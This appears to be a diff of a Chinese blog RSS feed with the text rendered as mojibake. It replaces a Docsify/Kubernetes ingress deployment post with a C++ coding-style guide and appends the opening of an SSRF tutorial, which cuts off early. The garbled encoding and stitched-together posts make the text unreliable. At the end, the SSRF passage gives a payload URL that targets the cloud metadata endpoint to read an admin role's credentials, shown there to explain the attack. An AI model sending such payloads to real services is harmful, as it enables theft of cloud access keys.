+<p>å¼ç¨ç¬¦å·åæéç¬¦å·ç´§è´´åé, å¦ææ <code>restrict</code> ååç±»ä¼¼ <code>long *restrict a, long *restrict b</code>.</p>
+<h3 id="å¿åå½æ°">å¿åå½æ°</h3>
+<p>åªè½ç¨äºåè°å½æ°, æ¯å¦:</p>
+<pre><code class="language-cpp">// std::vector&lt;long&gt; a
+std::sort(a.begin(), a.end(), [](long x, long y) {
+	return y &lt; x;
+});
+</code></pre>
+<blockquote>
+<p>å¾ææ¾è¿ä¸ªä¾å­å¹¶ä¸å¥½, å®å¨å¯ä»¥ç¨ <code>std::sort(a.rbegin(), a.rend())</code> ä¸è¡æå®çäºéè¦ç¨å¿åå½æ°, ä½è¿æ¯ä¸ºäºæ¼ç¤ºå¿åå½æ°æä»¥ææå¯å, å®éåºç¨ä¸­æå¥½æ¯ä½¿ç¨ <code>std::sort(a.rbegin(), a.rend())</code>.</p>
+</blockquote>
+<h2 id="main-å½æ°"><code>main</code> å½æ°</h2>
+<p>ç¨ <code>signed	main</code>, å¯ä»¥æ¯ <code>signed	main(int argc, char **argv)</code> ä¹å¯ä»¥æ¯ <code>signed	main(void)</code>, æ ¹æ®éæ±æ¥.</p>
+<p>æ²¡æåºéå <code>return 0</code>, å¦å <code>return 1</code>.</p>
+<h1 id="ç±»">ç±»</h1>
+<p>æ è®ºæ¯åçº¯å­æ°æ®è¿æ¯å¸¦æå½æ°, é½ç¨ <code>class</code>.</p>
+<h2 id="ç±»åé">ç±»åé</h2>
+<p>åéååå ä¸åçº¿, æ¯å¦ <code>ld_</code> <code>tot_</code>.</p>
+<p>æ ¹æ®éè¦å¯ä»¥æ¾ <code>private</code> æ <code>public</code>, ä¸å¿å¨æ¾å¨ <code>private</code>. æå¥½çä¾å­æ¯æç¨äºå¤çå¾çç±»:</p>
+<pre><code class="language-cpp">class	vtx {
+public:
+	std::vector&lt;vtx*&gt; to_;
+	long dfn_, low_;	// for tarjan
+	vtx *top_, *dear_mama_, *kid_;	// for æ é¾åå
 
-[Install]
-WantedBy=multi-user.target
+	void add_edge(vtx*);
+	void dfs_tarjan(/*anything*/);
+	void dfs1_hld(vtx*), dfs2_hld(vtx*);
+};
+
+vtx v[k_max_vtx];
 </code></pre>
-<p>sudo systemctl daemon-reload<br>
-sudo systemctl enable docsify  # è®¾ç½®å¼æºèªå¯<br>
-sudo systemctl start docsify</p>
-<h3 id="4-docsifyå®¿ä¸»æå¡æ¥å¥k8séç¾¤">4. Docsifyå®¿ä¸»æå¡æ¥å¥k8séç¾¤</h3>
-<p>Tokenå·¥åé¡¹ç®æ¯k8sé¨ç½²ï¼å·²ç»éä¸äºå¸¦sslè¯ä¹¦çååï¼æ¬æ¬¡å¸æ<strong>å°è¿ä¸ªDocsifyå®¿ä¸»æºæå¡å¿«éæ¥å¥k8séç¾¤</strong>ï¼ èµ°ä¸»ç«ç/docs è·¯å¾å°å¸®å©ææ¡£ç«ï¼åæ¶å©ç¨k8séç¾¤ä¸éç½®å¥½çè¯ä¹¦ï¼èµ°æ­£è§åè·¯çº¿ã</p>
-<h4 id="k8så¦ä½æ¥å¥å®¿ä¸»æºæå¡">k8så¦ä½æ¥å¥å®¿ä¸»æºæå¡ï¼</h4>
-<p>å°è¿ä¸ªå®¿ä¸»æºæå¡ï¼æ½è±¡ä¸ºk8sæå¡ï¼ä½æ¯éè¦èµ°èªå®ä¹<code>endpoint</code>æ¨¡å¼ã</p>
-<pre><code>apiVersion: v1
-kind: Service
-metadata:
-  name: external-docs-svc        # æå¡åï¼å¯èªå®ä¹
-  namespace: tokenhub
-spec:
-  ports:
-    - port: 3000                 
-      targetPort: 3000           
----
-apiVersion: v1
-kind: Endpoints
-metadata:
-  name: external-docs-svc        # å¿é¡»ä¸ Service åå
-  namespace: tokenhub
-subsets:
-  - addresses:
-      - ip: 10.8.65.1            # å¤é¨è¿ç¨ç IP
-    ports:
-      - port: 3000
+<h2 id="ç±»å½æ°">ç±»å½æ°</h2>
+<p>æ ¹æ®éè¦å¯ä»¥æ¾ <code>private</code> æ <code>public</code>, ä¸å¿å¨æ¾å¨ <code>public</code>, æå¥½çä¾å­æ¯çº¿æ®µæ :</p>
+<pre><code class="language-cpp">class	tree {
+	std::unique_ptr&lt;tree&gt; ld_, rd_;
+	long left_, right_;
+	long val_, tag_;
+
+	void push_up(void);	// ç§æ
+	void push_down(void);	// ç§æ
+
+public:
+	tree(long, long, const std::vector&lt;long&gt;&amp;);	// å¬æ
+	void update(long, long, long);	// å¬æ
+	long query(long, long, long);	// å¬æ
+};
 </code></pre>
-<h3 id="éç½®ingressè§åä¸»ç«èµ°docs-è·¯å¾å°å¸®å©ææ¡£ç«">éç½®ingressè§åï¼ä¸»ç«èµ°/docs è·¯å¾å°å¸®å©ææ¡£ç«</h3>
-<p>ingress path è·¯å¾å¹éï¼é»è®¤ä¸rewrite pathï¼ä¸ºäºè®©å¸®å©ææ¡£ç«ææè¯·æ±é½è¿å¥ç¹å®çæå¡ã</p>
-<p>æè·¯ä¹å¾æ¸æ°ï¼</p>
-<ul>
-<li>ä¸»ç«åå + <code>/docs</code>è·¯å¾è¯·æ±å°å¸®å©ææ¡£ç«ï¼åç«¯æå¡éè¦å³æ³¨/docsåç¼</li>
-<li>ä¸»ç«åå+ /`è¯·æ± å°ä¸»ç«æå¡ï¼</li>
-</ul>
-<pre><code>apiVersion: networking.k8s.io/v1
-kind: Ingress
-metadata:
-  name: tokenhub-ingress
-  namespace: tokenhub
-  annotations:
-    nginx.ingress.kubernetes.io/ssl-redirect: "true"
-    nginx.ingress.kubernetes.io/hsts: "true"
-    nginx.ingress.kubernetes.io/hsts-max-age: "31536000"
-    # å¦æåç«¯ææä¸å¸¦ /docs åç¼ï¼å¯åæ¶ä¸é¢æ³¨é
-    # nginx.ingress.kubernetes.io/rewrite-target:  /$2
-spec:
-  ingressClassName: nginx
-  tls:
-    - hosts:
-        - tokengine.hanyoai.com
-      secretName: tokenhub-tls
-  rules:
-    - host: tokengine.hanyoai.com
-      http:
-        paths:
-          - path: /docs
-            pathType: Prefix
-            backend:
-              service:
-                name: external-docs-svc   # æåä¸ä¸æ­¥åå»ºç Service
-                port:
-                  number: 3000
-          - path: /
-            pathType: Prefix
-            backend:
-              service:
-                name: new-api
-                port:
-                  number: 3000
+<h2 id="æé å½æ°">æé å½æ°</h2>
+<p>éå¸¸æ¨è, ä¸å®è¦ç¨åå§ååè¡¨. STL å®¹å¨å¯ä»¥åå§åæä¸åå§å. æºè½æéè§åææéé¨å.</p>
+<pre><code class="language-cpp">tree(long left, long right, const std::vector&lt;long&gt; &amp;a)
+	: left_(left), right_(right),
+	val_(0), tag_(0) {
+	if (left_ == right_) {
+		val_ = a[left_];
+		return;
+	}
+
+	ld_ = std::make_unique&lt;tree&gt;(left_, left_ + right_ &gt;&gt; 1, a);
+	rd_ = std::make_unique&lt;tree&gt;((left_ + right_ &gt;&gt; 1) + 1, right_, a);
+
+	push_up();
+}
 </code></pre>
-<p>åæ¶æä»¬å¿é¡»è®©å¸®å©ææ¡£ç«ååºçè¯·æ±é½ å¸¦ä¸<code>/docs</code>åç¼ï¼é£ä¹éè¦å°ä¸é¢docsify å·¥ä½ç®å½ä¸ææçmdæä»¶ç§»å¨å°ä¸ä¸ªdocsç®å½ä¸ï¼index.html ä½ç½®ä¸åï¼ã</p>
-<p>è¿æ ·ä¸»ç«/docsè·¯å¾å½ä¸­docsify é¦é¡µï¼ é¦é¡µéå¸¦çå¶ä»èµæºå ä¸ºå¨docsç®å½ä¸ï¼åèµ·è¯·æ±æ¶èªç¶ä¹æ/docsåç¼ï¼äºæ¯ç±èªç¶èç¶æ ¹æ®ingress /docsåç¼è¿å¥åç«¯æå¡ï¼ å®ç¾é­ç¯ã</p>
+<h3 id="æé å½æ°éä¸ºç±»åéåºå-å¤å¶-å¼ç¨-æ¢å«">æé å½æ°éä¸ºç±»åéåºå <em><strong>å¤å¶</strong></em>, <em><strong>å¼ç¨</strong></em>, <em><strong>æ¢å«</strong></em></h3>
+<p>å¤å¶æ¯è¯´ä½ è¦ç»ä¼ å¥ç object å¤å¶ä¸ä»½, ä¹å°±æ¯ <code>ld_ = new tree(*y-&gt;ld_)</code>.</p>
+<p>å¼ç¨æ¯è¯´ä½ è¦å¼ç¨ä¼ å¥ç object, ä¹å°±æ¯ <code>ld_ = y-&gt;ld_</code>.</p>
+<p>æ¢å«åå¾ææ¾å°±æ¯ä½ è¦è®©ä¼ å¥ç object å¤±æ, ä¹å°±æ¯ <code>ld_ = y-&gt;ld_</code>, æ³¨æä¸å®è¦é¢å¤åä¸è¡ <code>y-&gt;ld_ = nullptr</code>, æèç´æ¥å <code>ld_ = std::move(y-&gt;ld_)</code>.</p>
+<h2 id="ææå½æ°">ææå½æ°</h2>
+<p>éå¿è¦ä¸å, è®©æºè½æéå STL èªå¨éæ¾, å¦ææè£¸æéåå¨ææå½æ°éä»¥åçæ¹å¼ææ­».</p>
+<h2 id="éè½½è¿ç®ç¬¦">éè½½è¿ç®ç¬¦</h2>
+<p>éå¸¸æ¨è, æ¯å¦ç©éµä¹æ³, éè½½è¿ç®ç¬¦åå¯ä»¥æ¹ä¾¿çå®ç°ç©éµå¿«éå¹.</p>
+<h2 id="shared_from_this"><code>shared_from_this</code></h2>
+<p>åä¸ä¸è¦ç¨ <code>shared_from_this</code>, ä½¿ç¨ä¼ å¥ç <code>std::shared_ptr &amp;</code> æ <code>const std::shared_ptr &amp;</code> ä»£æ¿.</p>
+<p>åæ°åå»ºè®®å« <code>ref_this</code>, åå¤æ­:</p>
+<pre><code class="language-cpp">if (ref_this.get() != this)
+	std::terminate();
+</code></pre>
+<p>å½ç¶è¿éç°å¨ç¨ <code>pre</code> ä¼æ´æ¹ä¾¿äº.</p>
+<h3 id="stdweak_ptr-çéè½½çæ¬"><code>std::weak_ptr</code> çéè½½çæ¬</h3>
+<p>æ¯å¦è¯´æ <code>classx::work(std::shared_ptr&lt;classx&gt; &amp;ref_this)</code>, è¿æ¶åæè¿ä¼åä¸ä¸ªéè½½ç <code>classx::work(std::weak_ptr&lt;classx&gt; &amp;ref_this)</code>.</p>
+<p>åå®¹å¾ç®å, ç´æ¥è°ç¨:</p>
+<pre><code class="language-cpp">auto	work(std::shared_ptr&lt;classx&gt; &amp;ref_this) {
+	return work(ref_this.lock());
+}
+</code></pre>
+<p>è¿éä¸ºä»ä¹ææ¢å¨ <code>lock()</code> ä¸ºç©ºçæ¶åä¹ä¼ å¥å¢, å ä¸º <code>lock()</code> ä¸ºç©ºçæ¶åæ¯éä¸è¿ <code>if (ref_this.get() != this)</code> çæ£æµç, å°±ç¸äº.</p>
+<h1 id="æé">æé</h1>
+<p>å°äºææææçé¨åäº.</p>
+<blockquote>
+<p>æå¥ <a href="https://codeforces.com/profile/__A1go_3F__" target="_blank" rel="noopener nofollow">3f</a> çæéå²å­¦å¤§å¤æ¥æºäº <a href="https://codeforces.com/profile/MyCall" target="_blank" rel="noopener nofollow">mycall</a>, èæçæéå²å­¦é¨åæ¥æºäº <a href="https://codeforces.com/profile/_Fusu" target="_blank" rel="noopener nofollow">ä¸æ¶èä¸å¥³å£«</a> å¦å¤çæ¥æºäº <a href="https://www.youtube.com/@TheCherno" target="_blank" rel="noopener nofollow">the cherno</a>.</p>
+</blockquote>
+<p>æçå¤§æ¦æ³æ³å°±æ¯è¯´, è£¸æéæå <code>.bss</code> (å«è·æè¯´å¨å±åéå¨åå§ååä¼è·å° <code>.data</code>, æè¯´æ¯ <code>.bss</code> å°±æ¯ <code>.bss</code>), æºè½æéæå <code>.heap</code>, å¼ç¨æå <code>.stack</code>, ä¸è¦è¶ç.</p>
+<h2 id="è£¸æé">è£¸æé</h2>
+<p>ç¨äºç®¡çå¾è®ºçé¡¶ç¹ (æ è®ºä¹å±äºå¾è®º).</p>
+<p>å°½éå°½éå°½éä¸è¦ç¨è£¸æéå­å¨ <code>new</code>.</p>
+<p>å ä¸ºå¾è®ºæ¯å¤æç, ä½åæ¯ä¸åç, è¿æ°å¥½ä¹æ¯è£¸æéçä¼å¿, æä»¥æä»¬è¿æ ·å:</p>
+<pre><code class="language-cpp">constexpr long k_max_vtx = 1l &lt;&lt; 17;
+class	vtx;
+extern	vtx v[k_max_vtx];	// æåå£°æ, åé¢å°±è½å¤æ­äº
+
+class	vtx{
+public:
+	std::vector&lt;vtx*&gt; to_;
+
+	void	add_edge(vtx *y)
+		pre(v &lt;= this &amp;&amp; this &lt; v + k_max_vtx &amp;&amp; v &lt;= y &amp;&amp; y &lt; v + k_max_vtx) {
+		to_.emplace_back(y);
+	}
+};
+
+vtx v[k_max_vtx];
+</code></pre>
+<h3 id="å³äº-char-argv">å³äº <code>char **argv</code></h3>
+<p>æçä¹ æ¯æ¯è¿æ ·:</p>
+<pre><code class="language-cpp">signed	solve(const std::span&lt;std::string_view&gt;&amp;);
+
+signed	main(int argc, char **argv) {
+	std::vector&lt;std::string_view&gt; tmp(argv, argv + argc);
+	std::span&lt;std::string_view&gt; args(tmp);
+	return solve(args);
+}
+</code></pre>
+<blockquote>
+<p>å¾æ¾ç¶è¿æ¯åé´äº java ç <code>String[] args</code>, ä½ java ä½ä¸ºååè¯­è¨ä¹æ¯å¯ä»¥åé´çä¼ç§è®¾è®¡.</p>
+</blockquote>
+<h2 id="æºè½æé">æºè½æé</h2>
+<h3 id="ç¬å æé">ç¬å æé</h3>
+<p>ç¬å æéçè¯­ä¹æ¯, è¿ä¸ªåå®¹æ¯ä½ èªå·±ç.</p>
+<p>å¾å¥½çä¾å­æ¯çº¿æ®µæ  / å¹³è¡¡æ , ä½ çå­©å­é¡¶ç¹è¯å®æ¯ä½ ç¬å ç, æä»¥æä»¬ç¨ç¬å æé.</p>
+<pre><code class="language-cpp">class	tree {
+	std::unique_ptr&lt;tree&gt; ld_, rd_;
+	// other
+};
+</code></pre>
+<h3 id="å±äº«æé">å±äº«æé</h3>
+<p>å±äº«æéçè¯­ä¹æ¯, è¿ä¸ªåå®¹æ¯å¬æç.</p>
+<p>å¾å¥½çä¾å­æ¯æä¹åçº¿æ®µæ , ä½ çå­©å­æ¯ç»§æ¿ç / ä¿®æ¹ç, æä»¥æä»¬ç¨å±äº«æé.</p>
+<pre><code class="language-cpp">class	tree {
+	std::shared_ptr&lt;tree&gt; ld_, rd_;
+	// other
+};
+</code></pre>
+<h3 id="å¼±æé">å¼±æé</h3>
+<p>å¼±æéçè¯­ä¹æ¯, æè¿æ¯ä¸ªå±äº«æé, ä½æ¯æä¸åä¸å¼ç¨è®¡æ°, ç¨äºé¿åå¾ªç¯å¼ç¨.</p>
+<p>å¾å¥½çä¾å­æ¯åé¾è¡¨.</p>
+<pre><code class="language-cpp">class	list_vtx {
+public:
+	std::weak_ptr&lt;list_vtx&gt; pre_;
+	std::shared_ptr&lt;list_vtx&gt; nxt_;
+	// other
+};
+</code></pre>
+<p>iso å cherno è®¤ä¸ºçå¼±æéè¯­ä¹æ¯, è¿ä¸ªå¯¹è±¡å¯è½æ´»çä¹å¯è½æ­»äº, æä»¥ä½¿ç¨ä¹åéè¦åæ£æ¥. ä½æä¸è®¤åè¿ä¸ªè¯­ä¹.</p>
+<p>å¾æ¾ç¶åæçåé¾è¡¨å°±æ¯é¿åå¾ªç¯å¼ç¨æç¨çå¼±æé, ä½ æ éä½¿ç¨ <code>if (pre_.lock())</code> å°±è½ç¡®å® <code>pre_.lock()</code> æ¯ææç, å¦ææ æåè¯´æä½ çåé¾è¡¨æ¯éè¯¯ç (å½ç¶äº, å¤´é¡¶ç¹ç <code>pre_</code> å°±åºè¯¥æ¯ç©ºç, èåé¢æ¯ä¸ªé¡¶ç¹ç <code>pre_</code> é½åºè¯¥æ¯ææç), èå¦æéäºå°±ä¼å ä¸º <code>pre_.lock()</code> ä¸ºç©ºèåæ¶ fail fast.</p>
+<p>å é¤é¡¶ç¹ <code>x</code> ç´æ¥ <code>x-&gt;pop()</code>:</p>
+<pre><code class="language-cpp">void	pop(void) {
+	if (nxt_)	// å¦æåä¿®æ¹ pre_-&gt;nxt_ åä¼å¯¼è´å¼ç¨è®¡æ°ä¸º 0, æä»¥åä¿®æ¹ nxt_-&gt;pre_
+		nxt_-&gt;pre_ = pre_;
+	pre_.lock()-&gt;nxt_ = nxt_;	// å¤´é¡¶ç¹ä¸å­æ°æ®, æä»¥å­æ°æ®çé¡¶ç¹ä¸å®æ pre_
+	// å¼ç¨è®¡æ°ä¸º 0 èªå¨å é¤, ä¼è°ç¨ææå½æ°
+}
+</code></pre>
+<h1 id="æé¡¹">æé¡¹</h1>
+<h2 id="ç¼©è¿">ç¼©è¿</h2>
+<p>ä½¿ç¨ tab å¯ä»¥è®©ä½ çä»£ç å¨ä¸åç ide éå¯ä»¥æç§ä¸åäººçåå¥½æ¥ç¼©è¿, èä½¿ç¨ç©ºæ ¼ä¼å¯¼è´ææäººçå°çé½æ¯æç§ä½ çåå¥½è¿è¡çç¼©è¿.</p>
+<p>æå¹³æ¶ç¨ç 8 å­é¿ tab, å°äº <a href="https://codeforces.com/profile/MyCall" target="_blank" rel="noopener nofollow">mycall</a> ççµèä¸æ¾ç¤ºçæ¯ 2 å­é¿, è¿æ ·æä»¬ä¸¤äººççé½æ¹ä¾¿.</p>
+<h2 id="è¡é¿éå¶">è¡é¿éå¶</h2>
+<p>æä¸ªäººåæ¬¢æè¡é¿éå¶ä¸º 1mol ä¸ªå­é¿, æè§å¾è¿åéå¶è¡é¿ (æ¯å¦ 80 å­é¿) æ¯ä¸å¥½ç <a href="https://en.wikipedia.org/wiki/Don_Quixote" target="_blank" rel="noopener nofollow">don quixote</a> é£æ ¼.</p>
+<p>å¨ 1mol å­é¿éå¶çæåµä¸, ä¸è¡çé¿åº¦ç»å¸¸è¶åºæçæ¾ç¤ºå¨, é£ä¹æå°±ä¼ä½¿ç¨è¿ä¸ªè®¾ç½®:</p>
+<pre><code class="language-json">"editor.wordWrap": "bounded",	// å¨å±å¹å®½åº¦åä»£ç è¡é¿éå¶çè¾å°å¼å¤èªå¨æè¡, å®éè¿å¨åä¸è¡
+"editor.wordWrapColumn": 1073741824,	// vscode æå¤§è¡é¿éå¶
+"editor.wrappingIndent": "same",	// èªå¨æè¡åç»´æç¸åç¼©è¿
+"editor.wrappingStrategy": "advanced",	// è®© vscode è®¡ç®è¡é¿, å ä¸º tab çå­é¿ä¸ä¸å®æ¯ 1 æä»¥éè¦
+</code></pre>
+<h2 id="è¿ç®ç¬¦">è¿ç®ç¬¦</h2>
+<p>äºåè¿ç®ç¬¦åä¸åè¿ç®ç¬¦ä¸¤è¾¹å ç©ºæ ¼, æ¯è¾ç¾è§, æ²¡ä»ä¹ç¹å«çç¨å¤. ä¸åè¿ç®ç¬¦å¯å å¯ä¸å .</p>
+<p>å¦æä¸ä¸ªå°æ¹ä½ æ³è¦çä¼åçº§ç¬¦å <a href="https://en.cppreference.com/w/cpp/language/operator_precedence.html" target="_blank" rel="noopener nofollow">iso çä¼åçº§</a> é£å°±ä¸è¦å æ¬å·, æ¯å¦åä¸­ç¹ä½ æ³è¦ <span class="math inline">\(\cfrac{left\_+right\_}{2}\)</span> å°±å¯ä»¥ç´æ¥å <code>left_ + right_ &gt;&gt; 1</code>.</p>
+<p>é¢å¤ç, æè¿åæ¬¢æ <code>x &gt; y</code> åæ <code>y &lt; x</code>, å ä¸ºæä¸å¤ªåæ¬¢å¤§äºå·...</p>
+<h3 id="ç®¡éè¿ç®ç¬¦">ç®¡éè¿ç®ç¬¦</h3>
+<p>ä¸è¦ç¨, ä¸è¦ç¨, ä¸è¦ç¨.</p>
+<p>å¦æä½ éè¦éåä¸ä¸ªéå, ä½ åºè¯¥åçæ¯åæé è¿ä¸ªéå, æ è®ºæ¯ <code>std::vector&lt;long&gt; euler_sieve(long max)</code> è¿æ¯ <code>std::views::iota(0uz, v.size())</code> é½æ¯æé çæ¹å¼.</p>
+<p>ä½ç®¡éæ¯ä¸ªå¥æªçä¸è¥¿, ç®¡éçå«ä¹æ¯åæé åºä¸ä¸ªå¨é, ç¶åç¨æ·æ±°èµçæ¹å¼éåºä½ éè¦çéå. æè§å¾è¿éå¸¸ä¸æç¡®, ä¸å¦ç´æ¥æé åºæ³è¦çéå.</p>
+<h3 id="goto-è¿ç®ç¬¦"><code>goto</code> è¿ç®ç¬¦</h3>
+<p>è¿æ¯è¿ç®ç¬¦å? åæ­£æåæ¬¢å½æè¿ç®ç¬¦.</p>
+<p>å¯ä»¥éå½ä½¿ç¨, å½ä¸ä»å½ä½ æ¯å¾ä¸è·³. ä¸è¦ç¨æ¥è·³å°å½æ°æåç»ä¸éæ¾èµæºå ä¸ºèµæºåºè¯¥è®©æºè½æéèªå¨éæ¾, èæ¯ç¨äºç¶ææºçè®¾è®¡.</p>
+<p>æ¯å¦ååçåºé´æ±å:</p>
+<pre><code class="language-cpp">long	query(std::size_t p, std::size_t q) const
+	pre(p &lt;= q &amp;&amp; 0 &lt;= p &amp;&amp; q &lt; a.size()) {
+	std::size_t from = pos_[p], term = pos_[q];
+	long yt = 0;
+
+	if (from != term)
+		goto qry_from;
+
+	for (std::size_t x = p; x &lt;= q; ++x)
+		yt += a_[x] + tag_[from];
+	
+	return yt;
+
+qry_from:
+	if (from_[from] == p)	// æ´ååå½ææ´å
+		goto qry_term;
+
+	for (std::size_t x = p; x &lt;= term_[from]; ++x)
+		yt += a_[x] + tag_[from];
+
+	from++;
+
+qry_term:
+	if (q == term_[term])	// æ´ååå½ææ´å
+		goto qry_ssr;
+
+	for (std::size_t x = from_[term]; x &lt;= q; ++x)
+		yt += a_[x] + tag_[term];
+
+	term--;
+
+qry_ssr:
+	for (std::size_t x = from; x &lt;= term; ++x)
+		yt += sum_[x];
+
+	return yt;
+}
+</code></pre>
+<h2 id="ä»£ç å">ä»£ç å</h2>
+<p><code>if</code> åç©ºæ ¼ååæ¡ä»¶, <code>for</code> åç©ºæ ¼ååå¾ªç¯æè¿°, <code>while</code> åç©ºæ ¼ååæ¡ä»¶, ç¦ç¨ <code>switch</code>.</p>
+<p>å ä¸º <code>switch</code> æ²¡å <code>break</code> å®³æå¨åºæ¬ç®æ³ååæµè¯éä¸¢äº 160 å.</p>
+<p>å¨ <code>if</code> éèµå¼æ¯å¾å¸¸è§çæåµ, è¿æ¶å»ºè®®ä½¿ç¨åå±æ¬å·æ¥æç¡®è¯­ä¹, æ¯å¦è¯´æ åç dfs:</p>
+<pre><code class="language-cpp">void	dfs_kid(vtx *_) {
+	if ((dear_mama_ = _))	// if éåèµå¼å¹¶å¤æ­
+		depth_ = dear_mama_-&gt;depth_ + 1;
+	else
+		depth_ = 0uz;
+
+	size_ = 1uz;
+	kid_ = v;
+
+	for (vtx *y : to_) {
+		if (y-&gt;kid_)
+			continue;
+
+		y-&gt;dfs_kid(this);
+		size_ += y-&gt;size_;
+
+		if (kid_-&gt;size_ &lt; y-&gt;size_ || kid_-&gt;size_ &lt; y-&gt;size_ &amp;&amp; y &lt; kid_)
+			kid_ = y;
+	}
+}
+</code></pre>
+<h2 id="æ³¨é">æ³¨é</h2>
+<p>è¡åæ³¨éä½¿ç¨ <code>/**/</code> (ä¸åè®¸è·¨è¡), è¡æ«æ³¨éä½¿ç¨ <code>//</code>.</p>
+<h2 id="æä¸¾">æä¸¾</h2>
+<p>æ¨èä½¿ç¨ <code>enum class</code>, æ¯å¦è¯´æè®¾è®¡ game engine çæ¶åå°±æ:</p>
+<pre><code class="language-cpp">enum class color : long {
+	red = 0xff0000,
+	green = 0x00ff00,
+	blue = 0x0000ff
+};
+</code></pre>
+<p>è¿æ ·å°±å¯ä»¥ç¡®ä¿ä½¿ç¨ <code>color x = color::red</code> èä¸æ¯ <code>int x = color::red</code>.</p>
 
 
 </div>
 <div id="MySignature" role="contentinfo">
-    <hr style="FILTER: alpha(opacity=100,finishopacity=0,style=3)" width="80%" color="#987cb9" size="3">
-<div style="text-align:center;">
-<p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼{ææåº¦çé©¬ç²}ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/JulianHuang/p/20666309" target="_blank">https://www.cnblogs.com/JulianHuang/p/20666309</a></p>
-<strong style="color: red; ">æ¬¢è¿å³æ³¨æçååææ¯ãèåºå¬ä¼å·ï¼ å å¥½åè°å¤©è¯´å°ï¼ä¸èµ·è¿å</strong>
-<div><img style="width: 250px;height:250px;" src="https://blog-static.cnblogs.com/files/JulianHuang/QR.gif"> </div>
-
-</div>
+    åæåå¸äº <a href="https://www.cnblogs.com/young-tea/p/20671493" target="_blank">https://www.cnblogs.com/young-tea/p/20671493</a>, markdown ä¸º agplv3, å¾çä¸º cc0, ä½è: <a href="https://www.cnblogs.com/young-tea/" target="_blank">lil_tea</a>.
 </div>
 <div class="clear"></div>
 
             </div>
             <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0.30694444444444446" data-date-updated="2026-06-20 19:27">2026-06-20 12:05</span>&nbsp;
-<a href="https://www.cnblogs.com/JulianHuang">ç¥ä»å«ææ¶</a>&nbsp;
-éè¯»(<span id="post_view_count">39</span>)&nbsp;
+<span id="post-date" data-last-update-days="0.003472222222222222" data-date-updated="2026-06-20 23:04">2026-06-20 22:59</span>&nbsp;
+<a href="https://www.cnblogs.com/young-tea">lil_tea</a>&nbsp;
+éè¯»(<span id="post_view_count">9</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(20666309);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2FJulianHuang%2Fp%2F20666309&amp;targetId=20666309&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+<a href="javascript:void(0)" onclick="AddToWz(20671493);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fyoung-tea%2Fp%2F20671493&amp;targetId=20671493&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
 </div>
          ]]>
+    </description>
+    </item>
+<item>
+    <title><![CDATA[ SSRFæ¼æ´ï¼ä»åç½æ¢æµå°äºåæ°æ®çªåï¼é»å®¢æ¯æä¹ç»è¿çï¼ ]]></title>
+    <link>https://www.cnblogs.com/mliu/p/20631676</link>
+    <guid>71e88cc3a7a6c43234044dbc29970404</guid>
+    <description>
+    <![CDATA[ 
+        <h2 class="post-title">
+            <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/mliu/p/20631676" title="åå¸äº 2026-06-20 22:21">
+    <span role="heading" aria-level="2">SSRFæ¼æ´ï¼ä»åç½æ¢æµå°äºåæ°æ®çªåï¼é»å®¢æ¯æä¹ç»è¿çï¼</span>
+    
+
+</a>
+
+        </h2>
+        <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<div style="font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, sans-serif; line-height: 1.9; color: rgba(51, 51, 51, 1); max-width: 820px; margin: 0 auto; font-size: 15px">
+<p>ä¸ä¸ªæå¸®æååäºä¸æ¬¡çº¢èå¯¹æï¼å¯¹æ¹ä¸ä¸ªçä¼¼äººçæ å®³çãå¾çè£åªãåè½ï¼å·®ç¹è®©æä»¬ææ´ä¸ªé¿éäºè´¦å·ç AccessKey é½æåºæ¥äºã</p>
+<p>è¿å°±æ¯ <strong>SSRFï¼Server-Side Request Forgeryï¼æå¡ç«¯è¯·æ±ä¼ªé ï¼</strong> çå¨åââä½ ä»¥ä¸ºæ¯åç«¯ä¼ äºä¸ªURLï¼æå¡ç«¯èå®å·´äº¤å°å»è¯·æ±ï¼ç»æé£å°æå¡å¨å°±æäºé»å®¢çåç½è·³æ¿ã</p>
+<p>å¾å¤å¼åè§å¾ãæåäºIPç½ååå°±å®å¨äºãï¼ä½ç°å®æ¯ââ<strong>ç»è¿æ¹æ¡æ¯é²å¾¡æ¹æ¡å¤</strong>ãä»å¤©ææè¿å å¹´å®æä¸­éå°çSSRFæ»å»åºæ¯ãç»è¿ææ³åé²å¾¡æ¹æ¡å¨çæåºï¼çå®ä½ åºè¯¥è½å°è¸©å ä¸ªåã</p>
+<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">ä¸ä¸ªçå®æ¡ä¾ï¼å¾çè£åªå¼åçæ°æ®æ³é²</h2>
+<p>æçµåå¹³å°çç¨æ·å¤´ååè½ï¼æ¯æãä»URLå¯¼å¥å¤´åããåç«¯ä¼ ä¸ä¸ªå¾çé¾æ¥ï¼åç«¯å»ä¸è½½åè£åªã</p>
+<pre><code class="language-python"># ç®ååçä»£ç 
+def fetch_avatar(url):
+    resp = requests.get(url, timeout=5)
+    save_image(resp.content)
+    return "ok"</code></pre>
+<p>ççæ²¡æ¯çå¯¹å§ï¼ä½é®é¢æ¯ââ<strong>åç«¯æå¡å¨å¨åç½ï¼å®å¯ä»¥è®¿é®åç½èµæº</strong>ã</p>
+<p>æ»å»èä¼ äºè¿ä¹ä¸ä¸ªURLï¼</p>
+<pre><code>http://169.254.169.254/latest/meta-data/ram/security-credentials/admin-role</code></pre>
